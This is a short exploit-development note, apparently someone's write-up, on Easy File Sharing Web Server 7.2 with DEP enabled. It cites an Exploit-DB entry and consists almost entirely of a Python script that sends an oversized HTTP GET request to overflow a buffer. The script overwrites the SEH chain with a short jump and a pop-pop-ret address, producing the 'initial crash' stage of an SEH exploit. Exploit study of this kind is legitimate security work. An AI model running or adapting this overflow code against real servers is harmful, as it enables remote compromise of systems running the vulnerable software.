# Easy File Sharing Web Server 7.2 - DEP Enabled manually

Downloaded from: https://www.exploit-db.com/exploits/44522

## Initial Crash
```py
import socket
import os
import sys
import struct

ip = "127.0.0.1"
port = 80

#\x0a\x0d\x20\x25\x2f\x5c

CRASH_LEN = 5000  # change me
OFFSET = 4061  # change me

payload = b"A" * OFFSET
payload += struct.pack("<I",0x06eb9090) # short jump 8 - NSEH
payload += struct.pack("<I",0x100103fe) #PPR SEH
payload += b"\x90" * 10
payload += b"D" * (CRASH_LEN - len(payload))


buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()![immagine](https://user-images.githubusercontent.com/59916156/194387679-1029a1d5-e37f-4b34-a397-3c4efd998946.png)

```
